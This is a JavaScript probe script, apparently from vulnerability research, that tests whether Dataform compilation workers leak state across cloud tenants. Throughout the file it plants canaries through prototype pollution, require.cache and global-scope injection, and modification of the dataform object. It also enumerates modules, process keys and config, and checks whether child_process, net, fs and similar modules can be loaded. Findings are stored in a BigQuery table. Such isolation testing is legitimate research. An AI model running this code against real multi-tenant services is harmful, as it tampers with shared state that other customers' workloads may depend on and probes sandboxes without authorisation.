/**
 * Cross-Tenant Shared Worker State Probe
 * Version 2: No fs module (blocked), focus on JS-level state sharing
 *
 * Tests whether V8 compilation workers are shared across tenants
 * by checking for state persistence in:
 * - Global prototype modifications
 * - require.cache module injection
 * - Global scope variables
 * - dataform object modifications
 */

const timestamp = Date.now();
const uniqueId = Math.random().toString(36).substring(2, 15);
const canaryMarker = `CANARY_${timestamp}_${uniqueId}`;

// Results collector
const probeResults = {
  timestamp: new Date().toISOString(),
  probeId: canaryMarker,
  tests: {}
};

// ============================================
// TEST 1: Global Prototype Pollution
// ============================================
try {
  // Check if Object.prototype has been modified by previous compilation
  const existingPrototypeMarkers = [];
  for (let key in {}) {
    existingPrototypeMarkers.push(key);
  }

  // Check for our specific marker from previous runs
  const hasExistingCanary = Object.prototype.__crossTenantCanary !== undefined;
  const existingCanaryValue = Object.prototype.__crossTenantCanary;

  // Set our canary
  Object.prototype.__crossTenantCanary = canaryMarker;
  Object.prototype.__crossTenantTimestamp = timestamp;

  // Also try Array prototype
  const hasArrayCanary = Array.prototype.__crossTenantCanary !== undefined;
  const existingArrayCanary = Array.prototype.__crossTenantCanary;
  Array.prototype.__crossTenantCanary = canaryMarker;

  // Try Function prototype
  const hasFunctionCanary = Function.prototype.__crossTenantCanary !== undefined;
  const existingFunctionCanary = Function.prototype.__crossTenantCanary;
  Function.prototype.__crossTenantCanary = canaryMarker;

  // Try String prototype
  const hasStringCanary = String.prototype.__crossTenantCanary !== undefined;
  String.prototype.__crossTenantCanary = canaryMarker;

  probeResults.tests.prototypePollution = {
    objectPrototype: {
      existingMarkers: existingPrototypeMarkers,
      hadCanary: hasExistingCanary,
      existingCanaryValue: existingCanaryValue,
      setOurCanary: true
    },
    arrayPrototype: {
      hadCanary: hasArrayCanary,
      existingCanaryValue: existingArrayCanary,
      setOurCanary: true
    },
    functionPrototype: {
      hadCanary: hasFunctionCanary,
      existingCanaryValue: existingFunctionCanary,
      setOurCanary: true
    },
    stringPrototype: {
      hadCanary: hasStringCanary,
      setOurCanary: true
    }
  };
} catch (e) {
  probeResults.tests.prototypePollution = {
    error: e.message,
    stack: e.stack
  };
}

// ============================================
// TEST 2: require.cache Inspection & Injection
// ============================================
try {
  if (typeof require !== "undefined" && require.cache) {
    const cacheKeys = Object.keys(require.cache);
    const dataformModules = cacheKeys.filter(k => k.includes("dataform"));

    // Check for our injection marker
    const hasInjectedMarker = require.cache.__crossTenantInjection !== undefined;
    const existingInjection = require.cache.__crossTenantInjection;

    // Set our injection marker
    require.cache.__crossTenantInjection = {
      marker: canaryMarker,
      timestamp: new Date().toISOString(),
      message: "require.cache is shared if you see this in another compilation!"
    };

    // Try to enumerate what's in @dataform/core
    let dataformCoreInfo = null;
    const dataformCorePath = cacheKeys.find(k => k.includes("@dataform/core") || k.includes("bundle"));
    if (dataformCorePath && require.cache[dataformCorePath]) {
      dataformCoreInfo = {
        path: dataformCorePath,
        hasExports: !!require.cache[dataformCorePath].exports,
        exportKeys: Object.keys(require.cache[dataformCorePath].exports || {}).slice(0, 30)
      };
    }

    probeResults.tests.requireCache = {
      available: true,
      totalModules: cacheKeys.length,
      dataformModules: dataformModules.slice(0, 15),
      hadInjectedMarker: hasInjectedMarker,
      existingInjection: existingInjection,
      setOurInjection: true,
      dataformCoreInfo: dataformCoreInfo,
      allModulePaths: cacheKeys.slice(0, 30)
    };
  } else {
    probeResults.tests.requireCache = {
      available: false,
      hasRequire: typeof require !== "undefined"
    };
  }
} catch (e) {
  probeResults.tests.requireCache = {
    error: e.message
  };
}

// ============================================
// TEST 3: Global Scope Canary
// ============================================
try {
  // Check if global scope has markers from previous compilations
  const globalObj = typeof global !== "undefined" ? global : (typeof globalThis !== "undefined" ? globalThis : {});
  const globalKeys = Object.keys(globalObj);
  const suspiciousGlobals = globalKeys.filter(k =>
    k.includes("canary") || k.includes("marker") || k.includes("CANARY") ||
    k.includes("crossTenant") || k.includes("__") || k.includes("inject")
  );

  // Check our specific global marker
  const hasGlobalCanary = globalObj.__dataformCrossTenantCanary !== undefined;
  const existingGlobalCanary = globalObj.__dataformCrossTenantCanary;

  // Set our global canary
  globalObj.__dataformCrossTenantCanary = {
    marker: canaryMarker,
    timestamp: new Date().toISOString(),
    message: "Global scope is shared if you see this!"
  };

  // Also set a simple string marker
  globalObj.__CT_MARKER = canaryMarker;

  probeResults.tests.globalScope = {
    totalGlobals: globalKeys.length,
    suspiciousGlobals: suspiciousGlobals,
    hadCanary: hasGlobalCanary,
    existingCanaryValue: existingGlobalCanary,
    setOurCanary: true,
    globalSample: globalKeys.slice(0, 40)
  };
} catch (e) {
  probeResults.tests.globalScope = {
    error: e.message
  };
}

// ============================================
// TEST 4: Dataform Object Inspection
// ============================================
try {
  // Check for previous modifications to dataform object
  const hasDataformCanary = dataform.__crossTenantCanary !== undefined;
  const existingDataformCanary = dataform.__crossTenantCanary;

  // Set our marker on dataform
  dataform.__crossTenantCanary = canaryMarker;

  // Check projectConfig state
  const configState = {
    frozen: Object.isFrozen(dataform.projectConfig),
    sealed: Object.isSealed(dataform.projectConfig),
    extensible: Object.isExtensible(dataform.projectConfig),
    keys: Object.keys(dataform.projectConfig),
    values: {}
  };

  for (const key of Object.keys(dataform.projectConfig)) {
    configState.values[key] = String(dataform.projectConfig[key]).substring(0, 100);
  }

  probeResults.tests.dataformObject = {
    hadCanary: hasDataformCanary,
    existingCanaryValue: existingDataformCanary,
    setOurCanary: true,
    projectConfig: configState,
    availableFunctions: Object.keys(dataform).filter(k => typeof dataform[k] === "function")
  };
} catch (e) {
  probeResults.tests.dataformObject = {
    error: e.message
  };
}

// ============================================
// TEST 5: Module System Info
// ============================================
try {
  probeResults.tests.moduleInfo = {
    __dirname: typeof __dirname !== "undefined" ? __dirname : "N/A",
    __filename: typeof __filename !== "undefined" ? __filename : "N/A",
    moduleId: typeof module !== "undefined" ? module.id : "N/A",
    modulePaths: typeof module !== "undefined" && module.paths ? module.paths.slice(0, 10) : [],
    hasProcess: typeof process !== "undefined",
    processKeys: typeof process !== "undefined" ? Object.keys(process).slice(0, 20) : []
  };
} catch (e) {
  probeResults.tests.moduleInfo = { error: e.message };
}

// ============================================
// TEST 6: Check for blocked modules
// ============================================
try {
  const blockedModules = [];
  const testModules = ["fs", "path", "os", "child_process", "net", "http", "https", "crypto", "vm", "cluster"];

  for (const mod of testModules) {
    try {
      require(mod);
      blockedModules.push({ module: mod, blocked: false });
    } catch (e) {
      blockedModules.push({ module: mod, blocked: true, error: e.message });
    }
  }

  probeResults.tests.blockedModules = blockedModules;
} catch (e) {
  probeResults.tests.blockedModules = { error: e.message };
}

// ============================================
// Create Dataform Actions with Results
// ============================================

// Ensure config is set correctly
dataform.projectConfig.defaultDatabase = "shir-research-3";
dataform.projectConfig.defaultSchema = "dataform_poc";

// Create operation to store probe results
operate("cross_tenant_probe_results").queries([
  `-- Cross-Tenant Probe Results - ${canaryMarker}
   CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.cross_tenant_probe_results\` AS
   SELECT
     '${canaryMarker}' as probe_id,
     CURRENT_TIMESTAMP() as probe_time,
     SESSION_USER() as service_account,
     '${JSON.stringify(probeResults).replace(/'/g, "\\'")}' as results_json`
]);

// Create a view that shows the results nicely
publish("shared_worker_probe_view").query(`
  SELECT
    '${probeResults.timestamp}' as probe_timestamp,
    '${canaryMarker}' as probe_id,
    ${probeResults.tests.prototypePollution && probeResults.tests.prototypePollution.objectPrototype && probeResults.tests.prototypePollution.objectPrototype.hadCanary} as found_prototype_canary,
    ${probeResults.tests.requireCache && probeResults.tests.requireCache.hadInjectedMarker} as found_require_cache_marker,
    ${probeResults.tests.globalScope && probeResults.tests.globalScope.hadCanary} as found_global_canary,
    ${probeResults.tests.dataformObject && probeResults.tests.dataformObject.hadCanary} as found_dataform_canary
`);
